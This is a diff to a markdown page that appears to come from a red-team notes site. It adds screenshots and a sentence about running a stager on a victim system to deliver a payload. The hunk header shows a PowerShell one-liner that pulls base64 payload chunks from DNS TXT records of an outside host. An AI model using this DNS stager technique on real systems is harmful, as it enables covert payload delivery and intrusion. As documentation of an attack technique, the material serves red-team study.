@@ -104,6 +104,12 @@ $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-26.png)
+
+The stager then can be executed on the victim system to get the payload delivered:
+
+![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-12.png)
+
 Everything in action can be seen in the below gif:
 
 ![](../.gitbook/assets/invoke-powercloud-demo.gif)
